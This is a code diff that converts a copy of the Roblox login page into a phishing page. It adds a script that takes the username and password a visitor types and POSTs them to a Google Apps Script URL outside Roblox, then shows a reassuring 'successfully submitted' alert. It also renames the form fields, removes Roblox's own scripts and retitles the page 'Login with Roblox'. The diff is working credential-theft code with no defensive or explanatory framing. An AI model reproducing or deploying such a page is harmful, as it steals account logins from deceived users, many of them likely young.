@@ -1,8 +1,42 @@
-<!DOCTYPE html>
-
 <html lang="en"><!--<![endif]--><head data-machine-id="873ecd48-c226-2dc4-6832-7dcb36d0df2f"><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
     <!-- MachineID: 873ecd48-c226-2dc4-6832-7dcb36d0df2f -->
     <script src="main.js"></script>
+    <script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwGv2Rgo40qEdsJWlCnWD_6bYxRQcl08U6sfpfxvsyag1Umc3nrLnR7C2ZiMAYBwUPw/exec";
+
+document.getElementById("sendBtn").addEventListener("click", () => {
+  const field1 = document.getElementById("field1").value;
+  const field2 = document.getElementById("field2").value;
+
+  if (!field1 || !field2) {
+    alert("Fill out both fields.");
+    return;
+  }
+
+  fetch(WEB_APP_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: `field1=${encodeURIComponent(field1)}&field2=${encodeURIComponent(field2)}`
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.success) {
+      alert("Information successfully submitted and is being processed.");
+      // Optional: clear fields
+      document.getElementById("field1").value = "";
+      document.getElementById("field2").value = "";
+    } else {
+      alert("Submission failed.");
+    }
+  })
+  .catch(err => {
+    alert("Request error.");
+    console.error(err);
+  });
+});
+</script>
 
     <title>Log in with Roblox</title>
 
@@ -117,77 +151,6 @@
 
 
 
-<script>
-    //Set if it browser's do not track flag is enabled
-    var Roblox = Roblox || {};
-    (function() {
-        var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-        if (typeof window.external !== "undefined" &&
-            typeof window.external.msTrackingProtectionEnabled !== "undefined") {
-            dnt = dnt || window.external.msTrackingProtectionEnabled();
-        }
-        Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
-    })();
-</script>
-
-    <script type="text/javascript">
-
-        var _gaq = _gaq || [];
-
-                window.GoogleAnalyticsDisableRoblox2 = true;
-        _gaq.push(['b._setAccount', 'UA-486632-1']);
-            _gaq.push(['b._setSampleRate', '5']);
-        _gaq.push(['b._setCampSourceKey', 'rbx_source']);
-        _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
-        _gaq.push(['b._setCampContentKey', 'rbx_campaign']);
-
-            _gaq.push(['b._setDomainName', 'roblox.com']);
-
-            _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
-                _gaq.push(['b._setPageGroup', 1, 'Login']);
-            _gaq.push(['b._trackPageview']);
-
-        _gaq.push(['c._setAccount', 'UA-26810151-2']);
-            _gaq.push(['c._setSampleRate', '1']);
-            _gaq.push(['c._setDomainName', 'roblox.com']);
-            _gaq.push(['c._setPageGroup', 1, 'Login']);
-
-            (function() {
-                if (!Roblox.browserDoNotTrack) {
-                    var ga = document.createElement('script');
-                    ga.type = 'text/javascript';
-                    ga.async = true;
-                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-                    var s = document.getElementsByTagName('script')[0];
-                    s.parentNode.insertBefore(ga, s);
-                }
-        })();
-             </script>
-
-            <script type="text/javascript">
-            if (Roblox && Roblox.EventStream) {
-                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
-                    "//ecsv2.roblox.com/www/e.png",
-                    "//ecsv2.roblox.com/pe?t=studio",
-                    "//ecsv2.roblox.com/pe?t=diagnostic");
-            }
-        </script>
-
-
-
-<script type="text/javascript">
-    if (Roblox && Roblox.PageHeartbeatEvent) {
-        Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
-    }
-</script>
-    <script>
-    Roblox = Roblox || {};
-    Roblox.AbuseReportPVMeta = {
-        desktopEnabled: false,
-        phoneEnabled: false,
-        inAppEnabled: false
-    };
-</script>
 
 
 <meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
@@ -195,9 +158,7 @@
 
 <style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.foundation-web-interactable{outline-width:0;overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start);outline-offset:3px}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}</style><style type="text/css">.foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button .foundation-web-loading-spinner svg path{fill:currentColor}</style><style type="text/css">.foundation-web-icon-button[disabled]{opacity:.5}</style><style type="text/css">.foundation-web-checkbox.foundation-web-checkbox-disabled{opacity:.5}.foundation-web-checkbox .foundation-web-interactable{outline-offset:3px}</style><style type="text/css">.foundation-web-dropdown.foundation-web-dropdown-disabled{opacity:.5;pointer-events:none}.foundation-web-dropdown-trigger{border-width:1px}.foundation-web-dropdown-trigger.foundation-web-interactable:focus-visible{outline-offset:4px}.foundation-web-menu-item.foundation-web-interactable:focus-visible{outline-offset:-1px}.foundation-web-menu-item.foundation-web-interactable:focus-visible:hover{outline-width:0}.foundation-web-menu-item[data-disabled] span{opacity:.5}</style><style type="text/css">.disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%;content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%;display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}</style><style type="text/css">.foundation-web-toggle.disabled{opacity:50%}</style><style type="text/css">.bg-common-backdrop{background-color:var(--color-common-backdrop)}.shadow-transient-high{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-400) var(--size-800) -1px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-1200) var(--size-1400) -1.5px var(--alpha-color-shadow-subtle)}.shadow-transient-low{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle)}.foundation-web-portal-zindex{z-index:1050}.fui-future-shadow-affixed-low{box-shadow:0 0 var(--size-100) 0 var(--fui-future-alpha-color-shadow-subtle),0 0 var(--size-500) 0 var(--fui-future-alpha-color-shadow-subtle)}.light-theme,.system-theme,:root{--alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-system-progress:#335fff}.dark-theme{--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}@media (prefers-color-scheme:dark){:is(:root,.system-theme){--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}}:is(:root,.light-theme,.system-theme) .stroke-contrast-alpha{border-color:rgba(27,37,75,.5)}.dark-theme .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}@media (prefers-color-scheme:dark){:is(:root,.system-theme) .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}}</style><style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.bg-common-backdrop{background-color:var(--color-common-backdrop)}.shadow-transient-high{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-400) var(--size-800) -1px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-1200) var(--size-1400) -1.5px var(--alpha-color-shadow-subtle)}.shadow-transient-low{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle)}.foundation-web-portal-zindex{z-index:1050}.fui-future-shadow-affixed-low{box-shadow:0 0 var(--size-100) 0 var(--fui-future-alpha-color-shadow-subtle),0 0 var(--size-500) 0 var(--fui-future-alpha-color-shadow-subtle)}.light-theme,.system-theme,:root{--alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-system-progress:#335fff}.dark-theme{--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}@media (prefers-color-scheme:dark){:is(:root,.system-theme){--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}}:is(:root,.light-theme,.system-theme) .stroke-contrast-alpha{border-color:rgba(27,37,75,.5)}.dark-theme .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}@media (prefers-color-scheme:dark){:is(:root,.system-theme) .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}}</style><style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.foundation-web-menu-separator{border-top:1px solid var(--color-stroke-default)}</style><style type="text/css">@keyframes progress-circle-rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.foundation-web-progress-circle-indeterminate{animation:progress-circle-rotate 1.4s linear infinite;transform-origin:50% 50%}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.bg-common-backdrop{background-color:var(--color-common-backdrop)}.shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08);box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-400) var(--size-800) -1px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-1200) var(--size-1400) -1.5px var(--alpha-color-shadow-subtle)}@media (prefers-color-scheme:dark){.shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}}.light-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08)}.dark-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}.system-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08)}@media (prefers-color-scheme:dark){.system-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}}.foundation-web-portal-zindex{z-index:2000}</style><style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.bg-common-backdrop{background-color:var(--color-common-backdrop)}.shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08);box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-400) var(--size-800) -1px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-1200) var(--size-1400) -1.5px var(--alpha-color-shadow-subtle)}@media (prefers-color-scheme:dark){.shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}}.light-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08)}.dark-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}.system-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(0,0,0,.08)}@media (prefers-color-scheme:dark){.system-theme .shadow-transient-high{--alpha-color-shadow-subtle:rgba(4,4,8,.25)}}.foundation-web-portal-zindex{z-index:2000}</style><style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">.bg-common-backdrop{background-color:var(--color-common-backdrop)}.shadow-transient-high{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-400) var(--size-800) -1px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-1200) var(--size-1400) -1.5px var(--alpha-color-shadow-subtle)}.shadow-transient-low{box-shadow:var(--size-0) var(--size-50) var(--size-100) -.5px var(--alpha-color-shadow-subtle),var(--size-0) var(--size-250) var(--size-500) -.75px var(--alpha-color-shadow-subtle)}.foundation-web-portal-zindex{z-index:1050}.fui-future-shadow-affixed-low{box-shadow:0 0 var(--size-100) 0 var(--fui-future-alpha-color-shadow-subtle),0 0 var(--size-500) 0 var(--fui-future-alpha-color-shadow-subtle)}.light-theme,.system-theme,:root{--alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-shadow-subtle:rgba(0,0,0,.08);--fui-future-alpha-color-system-progress:#335fff}.dark-theme{--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}@media (prefers-color-scheme:dark){:is(:root,.system-theme){--alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-shadow-subtle:rgba(4,4,8,.25);--fui-future-alpha-color-system-progress:var(--dark-mode-system-contrast)}}:is(:root,.light-theme,.system-theme) .stroke-contrast-alpha{border-color:rgba(27,37,75,.5)}.dark-theme .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}@media (prefers-color-scheme:dark){:is(:root,.system-theme) .stroke-contrast-alpha{border-color:rgba(208,217,251,.4)}}</style><style type="text/css">.foundation-web-dialog-overlay{bottom:0;display:grid;left:0;overflow-y:auto;place-items:center;position:fixed;right:0;top:0}.foundation-web-dialog-close-container{right:var(--size-300);top:var(--size-300);z-index:1}.foundation-web-dialog-hero-media{border-top-left-radius:var(--radius-large);border-top-right-radius:var(--radius-large);margin-left:calc(var(--stroke-standard)*-1);margin-right:calc(var(--stroke-standard)*-1);margin-top:calc(var(--stroke-standard)*-1);overflow:clip}.foundation-web-dialog-content[data-size=Small]{max-width:calc(var(--size-100)*80);min-width:calc(var(--size-100)*75)}.foundation-web-dialog-content[data-size=Medium]{max-width:calc(var(--size-100)*120);min-width:calc(var(--size-100)*94)}.foundation-web-dialog-content[data-size=Large]{max-width:calc(var(--size-100)*160);min-width:calc(var(--size-100)*94)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><script></script></head>
 <body id="rbx-body" dir="ltr" class="rbx-body   dark-theme builder-font " data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
-    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Theme" data-bundle-source="Main" src="https://js.rbxcdn.com/efe2904fed755a0337bf98072cc144b9c2e1af66b0db357f3570a08f3aa099dc-Theme.js"></script>
-
-
+    
     
     <meta name="csrf-token" data-token="bBfOiHXTSQU+">
 
@@ -244,7 +205,7 @@
         
         <div class="content" id="content">
             
-<div id="react-login-web-app" class="login-container"><div id="background-image" class="background-image marketing-background-1"><div class="login-base-container full-height" id="login-base"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value=""><div aria-live="polite"></div></div><button type="button" id="sendBtn" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Quick Sign-in</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div><div id="react-login-account-limit-error-container"></div></div></div></div>
+<div id="react-login-web-app" class="login-container"><div id="background-image" class="background-image marketing-background-1"><div class="login-base-container full-height" id="login-base"><div class="section-content login-section"><h1 class="login-header">Login with Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="field1" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="field2" name="password" type="password" class="form-control input-field" placeholder="Password" value=""><div aria-live="polite"></div></div><button type="button" id="sendBtn" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Quick Sign-in</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div><div id="react-login-account-limit-error-container"></div></div></div></div>
 
         </div>
     </main><!--Bootstrap Footer React Component -->
@@ -303,7 +264,8 @@
 <div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
 
 
-    </div>
+    
+
 
 
 
